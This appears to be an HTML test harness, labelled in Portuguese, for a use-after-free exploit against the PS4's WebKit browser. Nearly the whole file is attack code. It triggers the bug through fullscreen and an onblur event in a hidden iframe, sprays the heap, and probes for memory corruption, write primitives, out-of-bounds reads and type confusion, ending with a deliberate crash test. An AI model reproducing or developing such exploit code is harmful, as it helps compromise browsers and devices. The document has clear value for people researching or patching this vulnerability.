<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit UAF Tests</title>
</head>
<body style="font-family:monospace;background:#000;color:#0f0;padding:10px;">

<h1>PS4 WebKit UAF - Testes de Sanidade</h1>

<div style="border:2px solid #ff0;padding:10px;margin:10px 0;">
    <strong>SEQUÊNCIA:</strong><br>
    1. Clique no botão do teste<br>
    2. Iframe abre em FULLSCREEN<br>
    3. Aperte OPTIONS (dispara onblur)<br>
    4. Teste executa automaticamente<br>
    5. Logs aparecem aqui
</div>

<div style="border:1px solid #0f0;padding:10px;margin:10px 0;">
    <h2>Teste 1: Detecção de Corrupção</h2>
    <button id="btn1" onclick="runTest(1)">Executar Teste 1</button>
    <button onclick="clearLog('log1')">Limpar</button>
    <div id="log1" style="background:#111;border:1px solid #0f0;padding:5px;height:200px;overflow-y:auto;font-size:11px;"></div>
</div>

<div style="border:1px solid #0f0;padding:10px;margin:10px 0;">
    <h2>Teste 2: Primitiva de Escrita</h2>
    <button id="btn2" onclick="runTest(2)">Executar Teste 2</button>
    <button onclick="clearLog('log2')">Limpar</button>
    <div id="log2" style="background:#111;border:1px solid #0f0;padding:5px;height:200px;overflow-y:auto;font-size:11px;"></div>
</div>

<div style="border:1px solid #0f0;padding:10px;margin:10px 0;">
    <h2>Teste 3: Out-of-Bounds Read</h2>
    <button id="btn3" onclick="runTest(3)">Executar Teste 3</button>
    <button onclick="clearLog('log3')">Limpar</button>
    <div id="log3" style="background:#111;border:1px solid #0f0;padding:5px;height:200px;overflow-y:auto;font-size:11px;"></div>
</div>

<div style="border:1px solid #0f0;padding:10px;margin:10px 0;">
    <h2>Teste 4: Type Confusion</h2>
    <button id="btn4" onclick="runTest(4)">Executar Teste 4</button>
    <button onclick="clearLog('log4')">Limpar</button>
    <div id="log4" style="background:#111;border:1px solid #0f0;padding:5px;height:200px;overflow-y:auto;font-size:11px;"></div>
</div>

<div style="border:1px solid #0f0;padding:10px;margin:10px 0;">
    <h2>Teste 5: Heap Spray Effectiveness</h2>
    <button id="btn5" onclick="runTest(5)">Executar Teste 5</button>
    <button onclick="clearLog('log5')">Limpar</button>
    <div id="log5" style="background:#111;border:1px solid #0f0;padding:5px;height:200px;overflow-y:auto;font-size:11px;"></div>
</div>

<div style="border:1px solid #0f0;padding:10px;margin:10px 0;">
    <h2>Teste 6: Crash Controllability</h2>
    <p style="color:#f00;">ESTE TESTE VAI CRASHAR O IFRAME</p>
    <button id="btn6" onclick="runTest(6)">Executar Teste 6</button>
    <button onclick="clearLog('log6')">Limpar</button>
    <div id="log6" style="background:#111;border:1px solid #0f0;padding:5px;height:200px;overflow-y:auto;font-size:11px;"></div>
</div>

<iframe id="testFrame" style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;"></iframe>

<script>
let currentTest = 0;

window.addEventListener('message', function(e) {
    if (e.data.type === 'log') {
        log('log' + currentTest, e.data.msg, e.data.lvl);
    } else if (e.data.type === 'done') {
        log('log' + currentTest, 'Teste completado', 'success');
        document.getElementById('btn' + currentTest).disabled = false;
        setTimeout(resetIframe, 1000);
    }
});

function log(id, msg, lvl) {
    const colors = {success: '#0f0', warning: '#ff0', error: '#f00', info: '#0af'};
    const d = document.getElementById(id);
    const t = new Date().toLocaleTimeString();
    d.innerHTML += '<div style="color:' + (colors[lvl] || '#0f0') + '">[' + t + '] ' + msg + '</div>';
    d.scrollTop = d.scrollHeight;
}

function clearLog(id) {
    document.getElementById(id).innerHTML = '';
}

function resetIframe() {
    const f = document.getElementById('testFrame');
    f.parentNode.removeChild(f);
    const n = document.createElement('iframe');
    n.id = 'testFrame';
    n.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;';
    document.body.appendChild(n);
}

function runTest(n) {
    currentTest = n;
    clearLog('log' + n);
    log('log' + n, 'Iniciando Teste ' + n, 'info');
    document.getElementById('btn' + n).disabled = true;
    
    const f = document.getElementById('testFrame');
    const d = f.contentDocument || f.contentWindow.document;
    d.open();
    d.write(getHTML(n));
    d.close();
}

function getHTML(n) {
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body style="margin:0;padding:20px;background:#000;color:#0f0;font-family:monospace;font-size:24px;text-align:center;"><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);"><h1>TESTE ' + n + '</h1><p id="m">Preparando...</p></div><script>function l(t,v){window.parent.postMessage({type:"log",msg:t,lvl:v||"info"},"*");}function d(){window.parent.postMessage({type:"done"},"*");}function m(t){document.getElementById("m").textContent=t;}function h(v){try{const b=new ArrayBuffer(8);new Float64Array(b)[0]=v;return "0x"+Array.from(new Uint8Array(b)).reverse().map(x=>x.toString(16).padStart(2,"0")).join("");}catch(e){return "ERR";}}setTimeout(()=>{m("Fullscreen...");l("Solicitando fullscreen","info");const e=document.documentElement;const r=e.webkitRequestFullscreen||e.requestFullscreen;if(r){r.call(e).then(()=>{m("FULLSCREEN!\\n\\nAPERTE OPTIONS!");l("Fullscreen ativo","success");l("Aguardando onblur...","warning");window.onblur=function(){m("OPTIONS!\\n\\nExecutando...");l("ONBLUR DISPARADO!","error");l("Iniciando exploit...","warning");t' + n + '();};}).catch(err=>{l("Erro fullscreen: "+err,"error");setTimeout(d,2000);});}else{l("Fullscreen indisponível","error");setTimeout(d,2000);}},500);' + getTest(n) + '<\/script></body></html>';
}

function getTest(n) {
    const t = {
        1: 'function t1(){let v=[];const M=2.121995791e-314,C=3000;l("Criando "+C+" arrays","info");m("Criando...");for(let i=0;i<C;i++){let a=new Float64Array(8);a[0]=i;a[1]=i*2;v.push(a);}l("Arrays criados","success");m("Spray...");l("Heap spray...","info");let s=[];for(let i=0;i<10000;i++){const p=new Float64Array(32);p.fill(M);s.push(p);}l("Spray completo (10000)","success");m("Verificando...");l("Procurando corrupção...","info");let c=0,x=[];for(let i=0;i<v.length;i++){if(v[i][0]===M){c++;x.push(i);if(c<=5){l("CORRUPÇÃO index "+i,"error");l("  Original: "+i,"info");l("  Atual: "+h(v[i][0]),"error");l("  [1]: "+h(v[i][1]),"info");}}}if(c>0){const r=(c/C*100).toFixed(2);l("","success");l("UAF CONFIRMADO!","error");l("Total: "+c+" de "+C,"error");l("Taxa: "+r+"%","warning");l("Índices: "+x.slice(0,10).join(", "),"info");m("UAF OK!\\n"+c+" corrompidos");}else{l("Sem corrupção","warning");m("Sem corrupção");}setTimeout(()=>{l("Executando document.write()","info");try{document.open();document.write("<html><body><h1>OK</h1></body></html>");document.close();}catch(e){}setTimeout(d,500);},2000);}',
        
        2: 'function t2(){let v=[];const S=2.121995791e-314;l("Preparando vítimas","info");m("Preparando...");for(let i=0;i<3000;i++){let a=new Float64Array(8);a.fill(0);v.push(a);}l("Vítimas prontas","success");m("Spray...");l("Heap spray","info");let s=[];for(let i=0;i<8000;i++){let a=new Float64Array(10);a.fill(S);s.push(a);}l("Spray completo (8000)","success");m("Procurando...");l("Procurando corrupção","info");let c=null,ix=-1;for(let i=0;i<v.length;i++){if(v[i][0]===S){c=v[i];ix=i;break;}}if(c){l("Vítima no index "+ix,"error");m("Testando escrita...");l("Testando escrita","info");const p=[{n:"DEADBEEF",v:0xDEADBEEF},{n:"LEET",v:0x1337C0DE},{n:"AAAA",v:0x41414141},{n:"BBBB",v:0x42424242}];let ok=0;p.forEach((t,i)=>{try{const w=new ArrayBuffer(8);new BigUint64Array(w)[0]=BigInt(t.v);c[i]=new Float64Array(w)[0];const r=new ArrayBuffer(8);new Float64Array(r)[0]=c[i];const rv=Number(new BigUint64Array(r)[0]);if(rv===t.v){l("  ["+i+"] "+t.n+": OK (0x"+t.v.toString(16)+")","success");ok++;}else{l("  ["+i+"] "+t.n+": MISMATCH","warning");}}catch(e){l("  ["+i+"] "+t.n+": ERRO","error");}});l("","info");if(ok===p.length){l("ESCRITA 100% OK!","success");l(ok+"/"+p.length+" testes OK","success");m("ESCRITA OK!\\n"+ok+"/"+p.length);}else{l("Escrita parcial: "+ok+"/"+p.length,"warning");m("Parcial "+ok+"/"+p.length);}}else{l("Sem corrupção","warning");m("Sem corrupção");}setTimeout(()=>{l("document.write()","info");try{document.open();document.write("<html><body><h1>OK</h1></body></html>");document.close();}catch(e){}setTimeout(d,500);},2000);}',
        
        3: 'function t3(){let v=[];const S=2.121995791e-314;l("Criando vítimas","info");for(let i=0;i<3000;i++)v.push(new Float64Array(8));m("Spray...");l("Heap spray","info");let s=[];for(let i=0;i<8000;i++)s.push(new Float64Array(10).fill(S));l("Spray completo","success");m("Testando OOB...");l("Procurando vítima","info");let c=v.find(x=>x[0]===S);if(c){l("Vítima encontrada","error");l("Testando OOB read","info");const lim=[8,16,32,64,128,256];let max=0;lim.forEach(L=>{let ok=0,u=new Set();for(let i=0;i<L;i++){try{const va=c[i];if(va!==undefined&&!isNaN(va)){ok++;u.add(h(va));}}catch(e){break;}}l("Limite "+L+": "+ok+" lidos, "+u.size+" únicos","info");if(ok>8){const ex=(ok-8)*8;max=Math.max(max,ex);l("  OOB! +"+ex+" bytes","error");}});if(max>0){l("","success");l("OOB READ OK!","error");l("Máximo: +"+max+" bytes","error");m("OOB!\\n+"+max+" bytes");}else{l("Sem OOB","warning");l("Limite: 64 bytes","info");m("Sem OOB");}}else{l("Sem corrupção","warning");m("Sem corrupção");}setTimeout(()=>{l("document.write()","info");try{document.open();document.write("<html><body><h1>OK</h1></body></html>");document.close();}catch(e){}setTimeout(d,500);},2000);}',
        
        4: 'function t4(){let tv=[],ov=[];l("Criando objetos mistos","info");m("Criando...");for(let i=0;i<1500;i++){tv.push(new Float64Array(8).fill(i));ov.push({id:i,data:"obj_"+i,n:{v:i*2}});}l("Objetos criados","success");m("Spray...");l("Heap spray","info");const P=2.121995791e-314;let s=[];for(let i=0;i<8000;i++)s.push(new Float64Array(10).fill(P));l("Spray completo","success");m("Verificando...");l("Verificando type confusion","info");let oc=0;ov.forEach((o,i)=>{try{if(typeof o.id!=="number"||o.id!==i){oc++;if(oc<=3)l("Objeto["+i+"] corrompido","error");}}catch(e){oc++;}});let tc=tv.filter(x=>x[0]===P).length;l("Float64: "+tc+" corrompidos",tc>0?"error":"success");l("Objetos: "+oc+" corrompidos",oc>0?"error":"success");if(oc>0){l("","success");l("TYPE CONFUSION!","error");m("TYPE CONFUSION!\\n"+oc);}else{l("Sem confusion","info");m("Sem confusion\\n"+tc);}setTimeout(()=>{l("document.write()","info");try{document.open();document.write("<html><body><h1>OK</h1></body></html>");document.close();}catch(e){}setTimeout(d,500);},2000);}',
        
        5: 'function t5(){const C=5000;let v=[];l("Criando "+C+" vítimas","info");m("Criando...");for(let i=0;i<C;i++)v.push(new Float64Array(8).fill(i));l("Vítimas prontas","success");m("Testando configs...");l("Testando configs spray","info");const cfg=[{s:1000,p:0x1111},{s:5000,p:0x2222},{s:10000,p:0x3333}];cfg.forEach((c,i)=>{const b=new ArrayBuffer(8);new Uint32Array(b)[0]=c.p;const f=new Float64Array(b)[0];let sp=[];for(let j=0;j<c.s;j++)sp.push(new Float64Array(10).fill(f));let cr=v.filter(x=>{const vb=new ArrayBuffer(8);new Float64Array(vb)[0]=x[0];return new Uint32Array(vb)[0]===c.p;}).length;const ef=(cr/C*100).toFixed(2);l("Config "+(i+1)+": size="+c.s+" -> "+cr+" ("+ef+"%)",cr>0?"error":"info");});m("Completo");setTimeout(()=>{l("document.write()","info");try{document.open();document.write("<html><body><h1>OK</h1></body></html>");document.close();}catch(e){}setTimeout(d,500);},2000);}',
        
        6: 'function t6(){let v=[];l("Preparando vítimas","info");m("Preparando...");for(let i=0;i<3000;i++)v.push(new Float64Array(8));l("Vítimas prontas","success");m("Spray...");l("Heap spray","info");const P=2.121995791e-314;let s=[];for(let i=0;i<8000;i++)s.push(new Float64Array(10).fill(P));l("Spray completo","success");m("Procurando...");let c=v.find(x=>x[0]===P);if(c){l("Vítima corrompida","error");l("CRASH em 3s","error");m("CRASH EM 3s");let cd=3;const iv=setInterval(()=>{l(cd+"...","error");m("CRASH EM "+cd+"s");cd--;if(cd<0){clearInterval(iv);l("TRIGGERING CRASH!","error");m("CRASHING!");try{document.open();document.write("<html><body><h1>CRASH</h1></body></html>");document.close();setTimeout(()=>location.reload(),100);}catch(e){l("Crash: "+e.message,"error");d();}}},1000);}else{l("Sem corrupção - não vai crashar","warning");m("Sem corrupção");setTimeout(()=>{l("document.write()","info");try{document.open();document.write("<html><body><h1>OK</h1></body></html>");document.close();}catch(e){}setTimeout(d,500);},2000);}}'
    };
    return t[n] || 'function t(){l("Não implementado","error");d();}';
}
</script>

</body>
</html>
